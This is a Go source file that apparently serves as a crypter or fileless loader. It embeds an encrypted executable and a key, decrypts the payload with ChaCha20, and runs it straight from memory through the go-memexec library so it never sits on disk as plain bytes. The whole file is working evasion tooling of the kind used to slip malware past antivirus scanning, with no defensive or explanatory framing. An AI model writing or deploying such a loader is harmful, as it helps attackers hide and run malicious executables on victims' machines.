package main

import (
	_ "embed"
	"log"
	"os"

	"github.com/amenzhinsky/go-memexec"
	"golang.org/x/crypto/chacha20"
)

//go:embed encrypted_Input.bin
var encryptedBytes []byte

//go:embed key.txt
var keyData []byte

func main() {
	peBytes, err := decryptFile()
	if err != nil {
		log.Fatalf("Failed to decrypt file: %v", err)
	}
	fileless(peBytes)
}

func decryptFile() ([]byte, error) {
	keyBytes := keyData[:32]
	nonceBytes := keyData[32:44]

	cipher, err := chacha20.NewUnauthenticatedCipher(keyBytes, nonceBytes)
	if err != nil {
		return nil, err
	}

	decryptedBytes := make([]byte, len(encryptedBytes))
	cipher.XORKeyStream(decryptedBytes, encryptedBytes)

	return decryptedBytes, nil
}

func fileless(execBytes []byte) {
	exe, err := memexec.New(execBytes)
	if err != nil {
		log.Fatalf("Failed to create memory executable: %v", err)
	}
	defer exe.Close()

	cmd := exe.Command()
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		log.Fatalf("Failed to execute in-memory: %v", err)
	}
	
	log.Println("Memory execution completed successfully")
} 